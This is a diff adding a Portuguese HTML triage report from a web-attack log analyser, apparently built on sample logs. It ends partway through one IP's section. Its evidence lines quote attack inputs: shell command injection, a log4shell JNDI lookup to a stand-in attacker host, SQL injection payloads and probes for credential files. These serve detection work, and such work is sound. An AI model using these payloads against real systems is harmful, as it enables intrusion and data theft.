@@ -1,0 +1,543 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:">
+<meta name="referrer" content="no-referrer">
+<title>Kallyel: relatório de análise de logs</title>
+<style>
+:root {
+  --bg: #f6f7f9; --surface: #ffffff; --text: #1b1f24; --muted: #5b6573; --line: #d9dde3;
+  --low: #3a7d5c; --medium: #a36a00; --high: #c2410c; --critical: #b3261e;
+  --accent: #1f4e8c; --code-bg: #eef0f3;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #14171b; --surface: #1c2025; --text: #e6e8eb; --muted: #9aa4b2; --line: #333a43;
+    --low: #5fbf8f; --medium: #e0a84a; --high: #f08a5d; --critical: #f2837c;
+    --accent: #8ab4f8; --code-bg: #262b32;
+  }
+}
+* { box-sizing: border-box; }
+body { margin: 0; background: var(--bg); color: var(--text);
+  font: 15px/1.55 system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
+main { max-width: 1040px; margin: 0 auto; padding: 24px 16px 64px; }
+h1 { font-size: 1.6rem; margin: 0 0 4px; }
+h2 { font-size: 1.25rem; margin: 32px 0 12px; border-bottom: 1px solid var(--line); padding-bottom: 6px; }
+h3 { font-size: 1.05rem; margin: 0; }
+.sub { color: var(--muted); margin: 0 0 16px; }
+.notice { background: var(--surface); border: 1px solid var(--line); border-left: 4px solid var(--accent);
+  padding: 10px 14px; border-radius: 6px; margin: 16px 0; }
+.notice.warn { border-left-color: var(--medium); }
+.notice.alert { border-left-color: var(--critical); }
+.cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; }
+.card { background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 10px 12px; }
+.card b { display: block; font-size: 1.4rem; }
+.card span { color: var(--muted); font-size: .85rem; }
+table { width: 100%; border-collapse: collapse; background: var(--surface); border: 1px solid var(--line);
+  border-radius: 8px; overflow: hidden; }
+th, td { text-align: left; padding: 8px 10px; border-bottom: 1px solid var(--line); vertical-align: top; }
+th { font-size: .8rem; text-transform: uppercase; letter-spacing: .03em; color: var(--muted); }
+tr:last-child td { border-bottom: 0; }
+.table-wrap { overflow-x: auto; }
+code, pre { font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace; font-size: .85rem; }
+code { background: var(--code-bg); padding: 1px 5px; border-radius: 4px; overflow-wrap: anywhere; }
+pre { background: var(--code-bg); padding: 8px 10px; border-radius: 6px; overflow-x: auto;
+  white-space: pre-wrap; overflow-wrap: anywhere; margin: 4px 0 10px; }
+.ip { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 14px 16px; margin: 14px 0; }
+.ip-head { display: flex; flex-wrap: wrap; gap: 10px; align-items: baseline; justify-content: space-between; }
+.badge { display: inline-block; padding: 1px 9px; border-radius: 999px; font-size: .78rem; font-weight: 600;
+  border: 1px solid currentColor; }
+.sev-low, .band-baixo { color: var(--low); } .sev-medium, .band-médio { color: var(--medium); }
+.sev-high, .band-alto { color: var(--high); } .sev-critical, .band-crítico { color: var(--critical); }
+.score { font-size: 1.1rem; font-weight: 700; }
+ul.comp { margin: 6px 0 12px; padding-left: 20px; }
+.finding { border-top: 1px solid var(--line); padding-top: 12px; margin-top: 12px; }
+.finding dl { margin: 8px 0; display: grid; grid-template-columns: max-content 1fr; gap: 4px 12px; }
+.finding dt { color: var(--muted); }
+.finding dd { margin: 0; }
+details summary { cursor: pointer; color: var(--accent); }
+.muted { color: var(--muted); }
+footer { margin-top: 40px; color: var(--muted); font-size: .85rem; }
+</style>
+</head>
+<body>
+<main>
+<h1>Relatório de análise de logs</h1>
+<p class="sub">Kallyel: análise de logs para detecção de ataques web · versão 0.1.0 · gerado em 2026-11-11 19:11:11 UTC</p>
+
+<div class="notice"><strong>Aviso:</strong> Este relatório é uma triagem automática, não um veredito. Regras por padrão geram falsos positivos e não cobrem todos os ataques; confirme cada achado nos logs originais antes de agir.</div>
+
+<h2>Resumo</h2>
+<div class="cards">
+  <div class="card"><b>12</b><span>achados</span></div>
+  <div class="card"><b>7</b><span>IPs com achados</span></div>
+  <div class="card"><b>22192</b><span>linhas lidas em 2 arquivo(s)</span></div>
+  <div class="card"><b>0</b><span>linhas NÃO reconhecidas (0.0%)</span></div>
+  <div class="card"><b>0</b><span>linhas truncadas</span></div>
+  <div class="card"><b>0</b><span>eventos de IPs ignorados</span></div>
+</div>
+
+
+<h2>IPs por risco</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>#</th><th>IP</th><th>Risco</th><th>Fases</th><th>Regras</th><th>Período (UTC)</th></tr></thead>
+  <tbody>
+  <tr>
+    <td>1</td>
+    <td><a href="#ip-1"><code>203.0.113.203</code></a></td>
+    <td><span class="score band-crítico">79/100</span> <span class="muted">(crítico)</span></td>
+    <td>tentativa → sucesso</td>
+    <td>2</td>
+    <td>2024-01-01 01:01:06 a 2024-01-01 01:02:16</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td><a href="#ip-2"><code>203.0.113.207</code></a></td>
+    <td><span class="score band-alto">49/100</span> <span class="muted">(alto)</span></td>
+    <td>tentativa</td>
+    <td>1</td>
+    <td>2024-01-01 02:00:22 a 2024-01-01 02:00:32</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td><a href="#ip-3"><code>203.0.113.201</code></a></td>
+    <td><span class="score band-médio">32/100</span> <span class="muted">(médio)</span></td>
+    <td>reconhecimento</td>
+    <td>3</td>
+    <td>2024-01-01 00:31:28 a 2024-01-01 00:32:20</td>
+  </tr>
+  <tr>
+    <td>4</td>
+    <td><a href="#ip-4"><code>203.0.113.202</code></a></td>
+    <td><span class="score band-médio">28/100</span> <span class="muted">(médio)</span></td>
+    <td>tentativa</td>
+    <td>2</td>
+    <td>2024-01-01 00:46:17 a 2024-01-01 00:46:56</td>
+  </tr>
+  <tr>
+    <td>5</td>
+    <td><a href="#ip-5"><code>203.0.113.206</code></a></td>
+    <td><span class="score band-médio">24/100</span> <span class="muted">(médio)</span></td>
+    <td>tentativa</td>
+    <td>1</td>
+    <td>2024-01-01 01:45:33 a 2024-01-01 01:45:43</td>
+  </tr>
+  <tr>
+    <td>6</td>
+    <td><a href="#ip-6"><code>203.0.113.204</code></a></td>
+    <td><span class="score band-baixo">8/100</span> <span class="muted">(baixo)</span></td>
+    <td>tentativa</td>
+    <td>1</td>
+    <td>2024-01-01 01:15:55 a 2024-01-01 01:16:43</td>
+  </tr>
+  <tr>
+    <td>7</td>
+    <td><a href="#ip-7"><code>203.0.113.205</code></a></td>
+    <td><span class="score band-baixo">8/100</span> <span class="muted">(baixo)</span></td>
+    <td>tentativa</td>
+    <td>1</td>
+    <td>2024-01-01 01:30:44 a 2024-01-01 01:30:54</td>
+  </tr>
+  </tbody>
+</table>
+</div>
+
+<section class="ip" id="ip-1">
+  <div class="ip-head">
+    <h3>1. IP <code>203.0.113.203</code></h3>
+    <span class="score band-crítico">Risco 79/100 (crítico)</span>
+  </div>
+  <p class="muted">Período 2024-01-01 01:01:06 a 2024-01-01 01:02:16 · duração 1m10s · fases:
+tentativa → sucesso</p>
+  <strong>Como a pontuação foi calculada</strong>
+  <ul class="comp">
+    <li><b>+45</b> Gravidade crítica: 1 regra(s) × 45 pontos (KALLYEL-AUTH-002)</li>
+    <li><b>+20</b> Gravidade alta: 1 regra(s) × 20 pontos (KALLYEL-AUTH-001)</li>
+    <li><b>+4</b> Diversidade de técnicas: 2 técnicas ATT&amp;CK distintas (T1078, T1110): +4 por técnica além da primeira (máx. 20)</li>
+    <li><b>+10</b> Progressão entre fases: tentativa → sucesso: +10 por fase além da primeira (máx. 30)</li>
+  </ul>
+
+  <div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-critical">crítica</span> <code>KALLYEL-AUTH-002</code> Força bruta seguida de login com sucesso</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>1; de 2024-01-01 01:01:06 a 2024-01-01 01:02:16; fase: sucesso</dd>
+<dt>Critério</dt><dd>falhas de autenticação → login com sucesso em até 900s</dd>    <dt>Mapeamento</dt><dd>T1110, T1078, CWE-307, A07:2021</dd>
+    <dt>Motivo</dt><dd>O mesmo IP errou a autenticação 5 ou mais vezes e, em seguida, conseguiu entrar, dentro de 15 minutos. Indica que a senha pode ter sido adivinhada.</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Usuário legítimo que errou a senha várias vezes e depois acertou.</dd>
+    <dt>Mitigação</dt><dd>Tratar a conta como comprometida até prova em contrário: trocar credenciais, revisar a sessão aberta e os comandos executados, invalidar chaves e sessões, ativar autenticação multifator.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (4 de 1)</summary>
+    <div><code>meus-logs\auth.log:781</code> <span class="muted">2024-01-01 01:01:14</span></div>
+    <pre>2024-01-01T01:01:14+00:00 srv sshd[5002]: Failed password for invalid user ubuntu from 203.0.113.203 port 40002 ssh2</pre>
+    <div><code>meus-logs\auth.log:783</code> <span class="muted">2024-01-01 01:01:18</span></div>
+    <pre>2024-01-01T01:01:18+00:00 srv sshd[5003]: Failed password for invalid user oracle from 203.0.113.203 port 40003 ssh2</pre>
+    <div><code>meus-logs\auth.log:786</code> <span class="muted">2024-01-01 01:01:22</span></div>
+    <pre>2024-01-01T01:01:22+00:00 srv sshd[5004]: Failed password for invalid user test from 203.0.113.203 port 40004 ssh2</pre>
+    <div><code>meus-logs\auth.log:804</code> <span class="muted">2024-01-01 01:02:16</span></div>
+    <pre>2024-01-01T01:02:16+00:00 srv sshd[5020]: Accepted password for root from 203.0.113.203 port 41000 ssh2</pre>
+  </details>
+</div>
+
+  <div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-high">alta</span> <code>KALLYEL-AUTH-001</code> Força bruta de SSH</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>12; de 2024-01-01 01:01:06 a 2024-01-01 01:01:50; fase: tentativa</dd>
+<dt>Critério</dt><dd>5 ou mais eventos em até 120s</dd>    <dt>Mapeamento</dt><dd>T1110, CWE-307, A07:2021</dd>
+    <dt>Motivo</dt><dd>Um mesmo IP acumulou 5 ou mais falhas de autenticação SSH em até 2 minutos.</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Usuário legítimo que esqueceu a senha; automação com chave ou senha antiga; vários usuários atrás do mesmo NAT.</dd>
+    <dt>Mitigação</dt><dd>Desabilitar senha e usar chaves; fail2ban ou limitação de taxa; restringir SSH por firewall/VPN; não expor SSH à internet quando possível.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (5 de 12)</summary>
+    <div><code>meus-logs\auth.log:786</code> <span class="muted">2024-01-01 01:01:22</span></div>
+    <pre>2024-01-01T01:01:22+00:00 srv sshd[5004]: Failed password for invalid user test from 203.0.113.203 port 40004 ssh2</pre>
+    <div><code>meus-logs\auth.log:788</code> <span class="muted">2024-01-01 01:01:26</span></div>
+    <pre>2024-01-01T01:01:26+00:00 srv sshd[5005]: Failed password for invalid user postgres from 203.0.113.203 port 40005 ssh2</pre>
+    <div><code>meus-logs\auth.log:789</code> <span class="muted">2024-01-01 01:01:30</span></div>
+    <pre>2024-01-01T01:01:30+00:00 srv sshd[5006]: Failed password for root from 203.0.113.203 port 40006 ssh2</pre>
+    <div><code>meus-logs\auth.log:790</code> <span class="muted">2024-01-01 01:01:34</span></div>
+    <pre>2024-01-01T01:01:34+00:00 srv sshd[5007]: Failed password for admin from 203.0.113.203 port 40007 ssh2</pre>
+    <div><code>meus-logs\auth.log:791</code> <span class="muted">2024-01-01 01:01:38</span></div>
+    <pre>2024-01-01T01:01:38+00:00 srv sshd[5008]: Failed password for ubuntu from 203.0.113.203 port 40008 ssh2</pre>
+  </details>
+</div>
+
+</section>
+<section class="ip" id="ip-2">
+  <div class="ip-head">
+    <h3>2. IP <code>203.0.113.207</code></h3>
+    <span class="score band-alto">Risco 49/100 (alto)</span>
+  </div>
+  <p class="muted">Período 2024-01-01 02:00:22 a 2024-01-01 02:00:32 · duração 10s · fases:
+tentativa</p>
+  <strong>Como a pontuação foi calculada</strong>
+  <ul class="comp">
+    <li><b>+45</b> Gravidade crítica: 1 regra(s) × 45 pontos (KALLYEL-WEB-006)</li>
+    <li><b>+4</b> Diversidade de técnicas: 2 técnicas ATT&amp;CK distintas (T1059, T1190): +4 por técnica além da primeira (máx. 20)</li>
+  </ul>
+
+  <div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-critical">crítica</span> <code>KALLYEL-WEB-006</code> Possível injeção de comando ou execução remota de código</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>3; de 2024-01-01 02:00:22 a 2024-01-01 02:00:32; fase: tentativa</dd>
+    <dt>Mapeamento</dt><dd>T1190, T1059, CWE-78, CWE-94, A03:2021</dd>
+    <dt>Motivo</dt><dd>Metacaracteres de shell seguidos de comandos comuns, expressões de log4shell, chamadas de execução do PHP e shells na URL.</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Buscas ou fóruns técnicos que citem comandos; parâmetros que usam &#39;|&#39; ou &#39;;&#39; como separador seguido de um nome de comando.</dd>
+    <dt>Mitigação</dt><dd>Nunca passar entrada do usuário a shell ou eval; usar APIs sem shell; atualizar bibliotecas vulneráveis (ex.: Log4j); WAF; isolar o processo com privilégios mínimos.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (3 de 3)</summary>
+    <div><code>meus-logs\access.log:14438</code> <span class="muted">2024-01-01 02:00:22</span></div>
+    <pre>203.0.113.207 - - [01/Jan/2024:02:00:22 +0000] &#34;GET /ping?host=127.0.0.1;id HTTP/1.1&#34; 200 500 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:14451</code> <span class="muted">2024-01-01 02:00:27</span></div>
+    <pre>203.0.113.207 - - [01/Jan/2024:02:00:27 +0000] &#34;GET /ping?host=127.0.0.1%7Cwhoami HTTP/1.1&#34; 200 500 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:14463</code> <span class="muted">2024-01-01 02:00:32</span></div>
+    <pre>203.0.113.207 - - [01/Jan/2024:02:00:32 +0000] &#34;GET /api?x=${jndi:ldap://attacker.example.test/a} HTTP/1.1&#34; 200 500 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+  </details>
+</div>
+
+</section>
+<section class="ip" id="ip-3">
+  <div class="ip-head">
+    <h3>3. IP <code>203.0.113.201</code></h3>
+    <span class="score band-médio">Risco 32/100 (médio)</span>
+  </div>
+  <p class="muted">Período 2024-01-01 00:31:28 a 2024-01-01 00:32:20 · duração 52s · fases:
+reconhecimento</p>
+  <strong>Como a pontuação foi calculada</strong>
+  <ul class="comp">
+    <li><b>+24</b> Gravidade média: 3 regra(s) × 8 pontos (KALLYEL-WEB-004, KALLYEL-WEB-005, KALLYEL-WEB-007)</li>
+    <li><b>+8</b> Diversidade de técnicas: 3 técnicas ATT&amp;CK distintas (T1190, T1552, T1595): +4 por técnica além da primeira (máx. 20)</li>
+  </ul>
+
+  <div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-medium">média</span> <code>KALLYEL-WEB-005</code> User-Agent de ferramenta de varredura</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>53; de 2024-01-01 00:31:28 a 2024-01-01 00:32:20; fase: reconhecimento</dd>
+    <dt>Mapeamento</dt><dd>T1595.002</dd>
+    <dt>Motivo</dt><dd>O User-Agent se identifica como um scanner conhecido. Atacantes podem trocar o User-Agent, então a ausência deste achado não prova ausência de varredura.</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Testes de segurança autorizados ou monitoramento próprio da empresa.</dd>
+    <dt>Mitigação</dt><dd>Bloquear ou limitar por IP/WAF; verificar se o alvo foi realmente explorado olhando os demais achados do mesmo IP.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (5 de 53)</summary>
+    <div><code>meus-logs\access.log:3689</code> <span class="muted">2024-01-01 00:31:28</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:28 +0000] &#34;GET /dump HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3693</code> <span class="muted">2024-01-01 00:31:29</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:29 +0000] &#34;GET /manager HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3695</code> <span class="muted">2024-01-01 00:31:30</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:30 +0000] &#34;GET /dashboard HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3697</code> <span class="muted">2024-01-01 00:31:31</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:31 +0000] &#34;GET /uploads HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3701</code> <span class="muted">2024-01-01 00:31:32</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:32 +0000] &#34;GET /api HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+  </details>
+</div>
+
+  <div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-medium">média</span> <code>KALLYEL-WEB-007</code> Enumeração de recursos por pico de respostas 404</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>51; de 2024-01-01 00:31:28 a 2024-01-01 00:32:20; fase: reconhecimento</dd>
+<dt>Critério</dt><dd>30 ou mais eventos em até 60s</dd>    <dt>Mapeamento</dt><dd>T1595.003</dd>
+    <dt>Motivo</dt><dd>Um mesmo IP gerou 30 ou mais respostas 404 em até 60 segundos, padrão de varredura por lista de palavras (gobuster, ffuf e similares).</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Páginas com muitos recursos quebrados (imagens, scripts) acessadas por um único usuário; robôs de indexação mal configurados; NAT corporativo com vários usuários atrás de um IP.</dd>
+    <dt>Mitigação</dt><dd>Limitar taxa por IP (rate limiting, fail2ban); corrigir links quebrados para reduzir ruído; bloquear o IP se houver outros achados.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (5 de 51)</summary>
+    <div><code>meus-logs\access.log:3779</code> <span class="muted">2024-01-01 00:31:58</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:58 +0000] &#34;GET /wp-config.php.bak HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3783</code> <span class="muted">2024-01-01 00:31:59</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:59 +0000] &#34;GET /old HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3785</code> <span class="muted">2024-01-01 00:32:00</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:32:00 +0000] &#34;GET /dashboard/index.php HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3789</code> <span class="muted">2024-01-01 00:32:01</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:32:01 +0000] &#34;GET /config/index.php HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3792</code> <span class="muted">2024-01-01 00:32:02</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:32:02 +0000] &#34;GET /staging/index.php HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+  </details>
+</div>
+
+  <div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-medium">média</span> <code>KALLYEL-WEB-004</code> Acesso a arquivo sensível ou de configuração</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>7; de 2024-01-01 00:31:36 a 2024-01-01 00:32:17; fase: reconhecimento</dd>
+    <dt>Mapeamento</dt><dd>T1190, T1552.001, CWE-538, A05:2021</dd>
+    <dt>Motivo</dt><dd>Tentativa de ler arquivos que nunca deveriam ser públicos. A resposta 200 indica exposição real; 404 indica apenas sondagem (veja o status nas evidências).</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Varreduras de segurança autorizadas; ferramentas internas de monitoramento.</dd>
+    <dt>Mitigação</dt><dd>Manter segredos fora do diretório público; bloquear dotfiles no servidor web; remover phpinfo e backups; rotacionar qualquer credencial que tenha respondido 200.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (5 de 7)</summary>
+    <div><code>meus-logs\access.log:3713</code> <span class="muted">2024-01-01 00:31:36</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:36 +0000] &#34;GET /.htpasswd HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3736</code> <span class="muted">2024-01-01 00:31:44</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:44 +0000] &#34;GET /.env HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3742</code> <span class="muted">2024-01-01 00:31:47</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:47 +0000] &#34;GET /.git/config HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3759</code> <span class="muted">2024-01-01 00:31:53</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:53 +0000] &#34;GET /phpinfo.php HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+    <div><code>meus-logs\access.log:3779</code> <span class="muted">2024-01-01 00:31:58</span></div>
+    <pre>203.0.113.201 - - [01/Jan/2024:00:31:58 +0000] &#34;GET /wp-config.php.bak HTTP/1.1&#34; 404 162 &#34;-&#34; &#34;Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)&#34;</pre>
+  </details>
+</div>
+
+</section>
+<section class="ip" id="ip-4">
+  <div class="ip-head">
+    <h3>4. IP <code>203.0.113.202</code></h3>
+    <span class="score band-médio">Risco 28/100 (médio)</span>
+  </div>
+  <p class="muted">Período 2024-01-01 00:46:17 a 2024-01-01 00:46:56 · duração 39s · fases:
+tentativa</p>
+  <strong>Como a pontuação foi calculada</strong>
+  <ul class="comp">
+    <li><b>+20</b> Gravidade alta: 1 regra(s) × 20 pontos (KALLYEL-WEB-001)</li>
+    <li><b>+8</b> Gravidade média: 1 regra(s) × 8 pontos (KALLYEL-WEB-009)</li>
+  </ul>
+
+  <div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-high">alta</span> <code>KALLYEL-WEB-001</code> Possível SQL Injection na requisição</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>14; de 2024-01-01 00:46:17 a 2024-01-01 00:46:56; fase: tentativa</dd>
+    <dt>Mapeamento</dt><dd>T1190, CWE-89, A03:2021</dd>
+    <dt>Motivo</dt><dd>Padrões típicos de SQLi na URL: UNION SELECT, condição sempre verdadeira, funções de atraso e consulta ao catálogo do banco.</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Aplicações que aceitam SQL ou texto técnico em buscas; documentação sobre bancos de dados.</dd>
+    <dt>Mitigação</dt><dd>Consultas parametrizadas; WAF; validação de entrada; usuário do banco com privilégios mínimos.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (5 de 14)</summary>
+    <div><code>meus-logs\access.log:5479</code> <span class="muted">2024-01-01 00:46:17</span></div>
+    <pre>203.0.113.202 - - [01/Jan/2024:00:46:17 +0000] &#34;GET /products?id=1&#39;+or+&#39;1&#39;=&#39;1 HTTP/1.1&#34; 500 80 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:5486</code> <span class="muted">2024-01-01 00:46:20</span></div>
+    <pre>203.0.113.202 - - [01/Jan/2024:00:46:20 +0000] &#34;GET /products?id=1+UNION+SELECT+null,null,null HTTP/1.1&#34; 500 80 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:5493</code> <span class="muted">2024-01-01 00:46:23</span></div>
+    <pre>203.0.113.202 - - [01/Jan/2024:00:46:23 +0000] &#34;GET /products?id=1+UNION+ALL+SELECT+username,password+FROM+users HTTP/1.1&#34; 500 80 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:5499</code> <span class="muted">2024-01-01 00:46:26</span></div>
+    <pre>203.0.113.202 - - [01/Jan/2024:00:46:26 +0000] &#34;GET /products?id=1;select+pg_sleep(5) HTTP/1.1&#34; 500 80 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:5505</code> <span class="muted">2024-01-01 00:46:29</span></div>
+    <pre>203.0.113.202 - - [01/Jan/2024:00:46:29 +0000] &#34;GET /products?id=1&#39;+AND+SLEEP(5)--+ HTTP/1.1&#34; 500 80 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+  </details>
+</div>
+
+  <div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-medium">média</span> <code>KALLYEL-WEB-009</code> Pico de erros 500 provocados pelo mesmo IP</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>12; de 2024-01-01 00:46:17 a 2024-01-01 00:46:50; fase: tentativa</dd>
+<dt>Critério</dt><dd>10 ou mais eventos em até 60s</dd>    <dt>Mapeamento</dt><dd>T1190</dd>
+    <dt>Motivo</dt><dd>Um mesmo IP provocou 10 ou mais erros 500 em até 60 segundos. Fuzzing e tentativas de exploração costumam derrubar o código da aplicação em caminhos inesperados.</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Falha real da aplicação ou do banco de dados (vários IPs afetados ao mesmo tempo); testes de carga; clientes legítimos repetindo uma ação que falha.</dd>
+    <dt>Mitigação</dt><dd>Verificar o log da aplicação no mesmo horário; corrigir o erro tratado de forma insegura; validar entradas; limitar taxa por IP.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (3 de 12)</summary>
+    <div><code>meus-logs\access.log:5535</code> <span class="muted">2024-01-01 00:46:44</span></div>
+    <pre>203.0.113.202 - - [01/Jan/2024:00:46:44 +0000] &#34;GET /products?id=1;select+pg_sleep(5) HTTP/1.1&#34; 500 80 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:5539</code> <span class="muted">2024-01-01 00:46:47</span></div>
+    <pre>203.0.113.202 - - [01/Jan/2024:00:46:47 +0000] &#34;GET /products?id=1&#39;+AND+SLEEP(5)--+ HTTP/1.1&#34; 500 80 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:5548</code> <span class="muted">2024-01-01 00:46:50</span></div>
+    <pre>203.0.113.202 - - [01/Jan/2024:00:46:50 +0000] &#34;GET /search?q=x&#39;+UNION+SELECT+table_name+FROM+information_schema.tables-- HTTP/1.1&#34; 500 80 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+  </details>
+</div>
+
+</section>
+<section class="ip" id="ip-5">
+  <div class="ip-head">
